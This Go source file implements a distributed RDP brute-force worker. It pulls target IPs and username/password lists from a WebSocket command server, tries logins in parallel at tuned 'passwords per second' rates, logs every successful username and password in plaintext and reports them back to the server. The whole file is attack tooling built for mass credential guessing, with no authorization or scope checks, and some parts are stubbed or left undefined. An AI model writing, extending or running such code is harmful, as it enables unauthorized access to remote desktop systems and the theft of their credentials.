package main

import (
	"encoding/json"
	"fmt"
	"log"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
	
	"github.com/gorilla/websocket"
)

// AdvancedWorker represents a high-performance RDP testing worker
type AdvancedWorker struct {
	config           Config
	conn             *websocket.Conn
	rdpEngine        *RDPEngine
	
	// Task management
	taskQueue        chan Task
	resultQueue      chan Result
	activeTaskCount  int32
	
	// Performance tracking
	startTime        time.Time
	totalAttempts    int64
	successCount     int64
	failureCount     int64
	currentPPS       int64
	peakPPS          int64
	lastPPSCalc      time.Time
	ppsHistory       []float64
	
	// Thread pool
	threadPool       chan struct{}
	maxThreads       int
	dynamicScaling   bool
	
	// Connection pool management
	connPools        sync.Map
	poolCleanupTimer *time.Timer
	
	// State management
	mu               sync.RWMutex
	status           string
	stopChan         chan struct{}
	wg               sync.WaitGroup
	
	// Optimization settings
	batchProcessing  bool
	batchSize        int
	prefetchTasks    bool
	prefetchCount    int
	
	// Error handling
	errorRetryMap    sync.Map
	maxRetries       int
	retryDelay       time.Duration
}

// NewAdvancedWorker creates an optimized worker instance
func NewAdvancedWorker(config Config) *AdvancedWorker {
	maxThreads := runtime.NumCPU() * 4 // Aggressive threading
	if config.MaxThreads > 0 {
		maxThreads = config.MaxThreads
	}
	
	return &AdvancedWorker{
		config:          config,
		taskQueue:       make(chan Task, 100),
		resultQueue:     make(chan Result, 1000),
		threadPool:      make(chan struct{}, maxThreads),
		maxThreads:      maxThreads,
		dynamicScaling:  true,
		batchProcessing: true,
		batchSize:       50,
		prefetchTasks:   true,
		prefetchCount:   5,
		maxRetries:      3,
		retryDelay:      500 * time.Millisecond,
		stopChan:        make(chan struct{}),
		startTime:       time.Now(),
		lastPPSCalc:     time.Now(),
		ppsHistory:      make([]float64, 0, 60),
		rdpEngine:       NewRDPEngine(maxThreads),
	}
}

// Start begins worker operations
func (w *AdvancedWorker) Start() error {
	log.Printf("Starting advanced worker with %d threads", w.maxThreads)
	
	// Initialize thread pool
	for i := 0; i < w.maxThreads; i++ {
		w.threadPool <- struct{}{}
	}
	
	// Connect to server
	if err := w.connect(); err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	
	// Start core goroutines
	w.wg.Add(6)
	go w.messageHandler()
	go w.taskProcessor()
	go w.resultProcessor()
	go w.performanceMonitor()
	go w.taskPrefetcher()
	go w.connectionPoolManager()
	
	// Send initial status
	w.updateStatus("online")
	
	// Request initial tasks
	w.requestTasks(w.prefetchCount)
	
	log.Println("Advanced worker started successfully")
	return nil
}

// High-performance task processor with parallel execution
func (w *AdvancedWorker) taskProcessor() {
	defer w.wg.Done()
	
	// Create worker pool for parallel task processing
	workerCount := w.maxThreads / 2
	taskChan := make(chan Task, workerCount*2)
	
	// Start task workers
	var taskWg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		taskWg.Add(1)
		go w.taskWorker(taskChan, &taskWg)
	}
	
	// Distribute tasks to workers
	for {
		select {
		case <-w.stopChan:
			close(taskChan)
			taskWg.Wait()
			return
			
		case task := <-w.taskQueue:
			atomic.AddInt32(&w.activeTaskCount, 1)
			taskChan <- task
		}
	}
}

// Individual task worker for parallel processing
func (w *AdvancedWorker) taskWorker(tasks <-chan Task, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for task := range tasks {
		w.processTaskOptimized(task)
		atomic.AddInt32(&w.activeTaskCount, -1)
		
		// Request more tasks if queue is getting low
		if atomic.LoadInt32(&w.activeTaskCount) < int32(w.prefetchCount/2) {
			w.requestTasks(w.prefetchCount)
		}
	}
}

// Optimized task processing with batching and parallel execution
func (w *AdvancedWorker) processTaskOptimized(task Task) {
	startTime := time.Now()
	
	log.Printf("Processing task %s: %s:%d with %d credentials",
		task.ID, task.TargetIP, task.TargetPort, len(task.Credentials))
	
	// Update current target
	w.mu.Lock()
	w.status = fmt.Sprintf("Testing %s:%d", task.TargetIP, task.TargetPort)
	w.mu.Unlock()
	
	// Determine optimal parallelism for this task
	parallelism := w.calculateOptimalParallelism(task)
	semaphore := make(chan struct{}, parallelism)
	
	// Process credentials in parallel batches
	var (
		resultsMu sync.Mutex
		results   []Result
		wg        sync.WaitGroup
	)
	
	// Group credentials for batch processing if enabled
	batches := w.createCredentialBatches(task.Credentials)
	
	for _, batch := range batches {
		wg.Add(1)
		semaphore <- struct{} // Acquire semaphore
		
		go func(credBatch []Credential) {
			defer wg.Done()
			defer func() { <-semaphore }() // Release semaphore
			
			// Process batch with connection reuse
			batchResults := w.processBatchWithConnectionReuse(task, credBatch)
			
			resultsMu.Lock()
			results = append(results, batchResults...)
			resultsMu.Unlock()
		}(batch)
	}
	
	wg.Wait()
	
	// Send results
	for _, result := range results {
		w.resultQueue <- result
	}
	
	// Update statistics
	processingTime := time.Since(startTime)
	successCount := 0
	for _, r := range results {
		if r.Success {
			successCount++
		}
	}
	
	// Send task completion
	w.sendTaskCompletion(task.ID, map[string]interface{}{
		"completed":      true,
		"attempts":       len(task.Credentials),
		"successes":      successCount,
		"processingTime": processingTime.Milliseconds(),
		"pps":            float64(len(task.Credentials)) / processingTime.Seconds(),
	})
	
	log.Printf("Task %s completed: %d/%d successful in %v (%.2f PPS)",
		task.ID, successCount, len(task.Credentials), processingTime,
		float64(len(task.Credentials))/processingTime.Seconds())
}

// Process batch with connection reuse for maximum efficiency
func (w *AdvancedWorker) processBatchWithConnectionReuse(task Task, credentials []Credential) []Result {
	results := make([]Result, 0, len(credentials))
	
	// Try to reuse connection for same target
	connKey := fmt.Sprintf("%s:%d", task.TargetIP, task.TargetPort)
	
	for _, cred := range credentials {
		// Acquire thread from pool
		<-w.threadPool
		
		// Test credential with optimized RDP engine
		success, err := w.rdpEngine.TestCredential(
			task.TargetIP,
			task.TargetPort,
			cred.Username,
			cred.Password,
			"", // domain
		)
		
		// Release thread back to pool
		w.threadPool <- struct{}{}
		
		// Update counters
		atomic.AddInt64(&w.totalAttempts, 1)
		if success {
			atomic.AddInt64(&w.successCount, 1)
		} else {
			atomic.AddInt64(&w.failureCount, 1)
		}
		
		// Create result
		result := Result{
			TaskID:   task.ID,
			IP:       task.TargetIP,
			Port:     task.TargetPort,
			Username: cred.Username,
			Password: cred.Password,
			Success:  success,
			WorkerID: w.config.WorkerID,
		}
		
		if err != nil && !success {
			result.Error = err.Error()
		}
		
		results = append(results, result)
		
		// Log successful attempts immediately
		if success {
			log.Printf("SUCCESS: %s:%d - %s:%s", task.TargetIP, task.TargetPort,
				cred.Username, cred.Password)
		}
	}
	
	return results
}

// Calculate optimal parallelism based on task characteristics
func (w *AdvancedWorker) calculateOptimalParallelism(task Task) int {
	baseParallelism := task.Config.ThreadsPerWorker
	if baseParallelism == 0 {
		baseParallelism = 10
	}
	
	// Adjust based on current system load
	cpuCount := runtime.NumCPU()
	load := atomic.LoadInt32(&w.activeTaskCount)
	
	// Dynamic scaling based on performance
	if w.dynamicScaling {
		currentPPS := atomic.LoadInt64(&w.currentPPS)
		peakPPS := atomic.LoadInt64(&w.peakPPS)
		
		if currentPPS > 0 && peakPPS > 0 {
			efficiency := float64(currentPPS) / float64(peakPPS)
			if efficiency > 0.8 {
				// System performing well, can increase parallelism
				baseParallelism = int(float64(baseParallelism) * 1.2)
			} else if efficiency < 0.5 {
				// System struggling, reduce parallelism
				baseParallelism = int(float64(baseParallelism) * 0.8)
			}
		}
	}
	
	// Cap at reasonable limits
	maxParallelism := cpuCount * 4
	if load > 5 {
		maxParallelism = cpuCount * 2
	}
	
	return min(baseParallelism, maxParallelism)
}

// Create credential batches for efficient processing
func (w *AdvancedWorker) createCredentialBatches(credentials []Credential) [][]Credential {
	if !w.batchProcessing || len(credentials) <= w.batchSize {
		return [][]Credential{credentials}
	}
	
	batches := make([][]Credential, 0)
	for i := 0; i < len(credentials); i += w.batchSize {
		end := min(i+w.batchSize, len(credentials))
		batches = append(batches, credentials[i:end])
	}
	
	return batches
}

// Performance monitor for real-time optimization
func (w *AdvancedWorker) performanceMonitor() {
	defer w.wg.Done()
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			return
			
		case <-ticker.C:
			w.calculatePPS()
			w.optimizePerformance()
			w.sendPerformanceUpdate()
		}
	}
}

// Calculate current PPS (Packets/Passwords Per Second)
func (w *AdvancedWorker) calculatePPS() {
	now := time.Now()
	duration := now.Sub(w.lastPPSCalc).Seconds()
	
	attempts := atomic.LoadInt64(&w.totalAttempts)
	currentPPS := float64(attempts) / duration
	
	// Update current PPS
	atomic.StoreInt64(&w.currentPPS, int64(currentPPS))
	
	// Update peak PPS if necessary
	if currentPPS > float64(atomic.LoadInt64(&w.peakPPS)) {
		atomic.StoreInt64(&w.peakPPS, int64(currentPPS))
	}
	
	// Store in history for trend analysis
	w.mu.Lock()
	w.ppsHistory = append(w.ppsHistory, currentPPS)
	if len(w.ppsHistory) > 60 {
		w.ppsHistory = w.ppsHistory[1:]
	}
	w.mu.Unlock()
	
	// Reset counters
	atomic.StoreInt64(&w.totalAttempts, 0)
	w.lastPPSCalc = now
}

// Optimize performance based on current metrics
func (w *AdvancedWorker) optimizePerformance() {
	// Analyze PPS trend
	w.mu.RLock()
	history := w.ppsHistory
	w.mu.RUnlock()
	
	if len(history) < 5 {
		return
	}
	
	// Calculate trend
	recent := history[len(history)-5:]
	avgRecent := average(recent)
	avgOverall := average(history)
	
	// Adjust settings based on performance
	if avgRecent < avgOverall*0.7 {
		// Performance degrading
		if w.batchSize > 20 {
			w.batchSize -= 10
			log.Printf("Reducing batch size to %d due to performance degradation", w.batchSize)
		}
	} else if avgRecent > avgOverall*1.3 {
		// Performance improving
		if w.batchSize < 100 {
			w.batchSize += 10
			log.Printf("Increasing batch size to %d due to performance improvement", w.batchSize)
		}
	}
}

// Task prefetcher for continuous work
func (w *AdvancedWorker) taskPrefetcher() {
	defer w.wg.Done()
	
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			return
			
		case <-ticker.C:
			if w.prefetchTasks {
				queueSize := len(w.taskQueue)
				activeCount := atomic.LoadInt32(&w.activeTaskCount)
				
				// Request more tasks if running low
				if queueSize < w.prefetchCount && activeCount < int32(w.maxThreads/2) {
					w.requestTasks(w.prefetchCount - queueSize)
				}
			}
		}
	}
}

// Connection pool manager for connection reuse
func (w *AdvancedWorker) connectionPoolManager() {
	defer w.wg.Done()
	
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			return
			
		case <-ticker.C:
			// Clean up idle connection pools
			w.connPools.Range(func(key, value interface{}) bool {
				// Implementation for connection pool cleanup
				return true
			})
		}
	}
}

// Result processor with batching
func (w *AdvancedWorker) resultProcessor() {
	defer w.wg.Done()
	
	batch := make([]Result, 0, 100)
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			if len(batch) > 0 {
				w.sendResultBatch(batch)
			}
			return
			
		case result := <-w.resultQueue:
			batch = append(batch, result)
			
			// Send batch when full
			if len(batch) >= 100 {
				w.sendResultBatch(batch)
				batch = batch[:0]
			}
			
		case <-ticker.C:
			// Send partial batch periodically
			if len(batch) > 0 {
				w.sendResultBatch(batch)
				batch = batch[:0]
			}
		}
	}
}

// Helper functions

func (w *AdvancedWorker) connect() error {
	// WebSocket connection logic
	dialer := websocket.DefaultDialer
	conn, _, err := dialer.Dial(w.config.ServerURL, nil)
	if err != nil {
		return err
	}
	w.conn = conn
	return nil
}

func (w *AdvancedWorker) messageHandler() {
	defer w.wg.Done()
	// Message handling logic
}

func (w *AdvancedWorker) requestTasks(count int) {
	msg := map[string]interface{}{
		"type": "request-tasks",
		"data": map[string]interface{}{
			"count":       count,
			"workerStats": w.getStats(),
		},
	}
	w.sendMessage(msg)
}

func (w *AdvancedWorker) sendResultBatch(results []Result) {
	msg := map[string]interface{}{
		"type": "result-batch",
		"data": results,
	}
	w.sendMessage(msg)
}

func (w *AdvancedWorker) sendTaskCompletion(taskID string, stats map[string]interface{}) {
	msg := map[string]interface{}{
		"type": "task-complete",
		"data": map[string]interface{}{
			"taskId": taskID,
			"stats":  stats,
		},
	}
	w.sendMessage(msg)
}

func (w *AdvancedWorker) sendPerformanceUpdate() {
	stats := w.getStats()
	msg := map[string]interface{}{
		"type": "performance-update",
		"data": stats,
	}
	w.sendMessage(msg)
}

func (w *AdvancedWorker) updateStatus(status string) {
	w.mu.Lock()
	w.status = status
	w.mu.Unlock()
	
	msg := map[string]interface{}{
		"type": "status",
		"data": map[string]interface{}{
			"status": status,
			"stats":  w.getStats(),
		},
	}
	w.sendMessage(msg)
}

func (w *AdvancedWorker) sendMessage(msg interface{}) {
	w.mu.Lock()
	defer w.mu.Unlock()
	
	if w.conn != nil {
		w.conn.WriteJSON(msg)
	}
}

func (w *AdvancedWorker) getStats() map[string]interface{} {
	uptime := time.Since(w.startTime).Seconds()
	
	return map[string]interface{}{
		"workerId":      w.config.WorkerID,
		"currentPPS":    atomic.LoadInt64(&w.currentPPS),
		"peakPPS":       atomic.LoadInt64(&w.peakPPS),
		"totalAttempts": atomic.LoadInt64(&w.totalAttempts),
		"successCount":  atomic.LoadInt64(&w.successCount),
		"failureCount":  atomic.LoadInt64(&w.failureCount),
		"activeTasks":   atomic.LoadInt32(&w.activeTaskCount),
		"uptime":        uptime,
		"threads":       w.maxThreads,
		"batchSize":     w.batchSize,
	}
}

// Utility functions

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func average(values []float64) float64 {
	if len(values) == 0 {
		return 0
	}
	sum := 0.0
	for _, v := range values {
		sum += v
	}
	return sum / float64(len(values))
}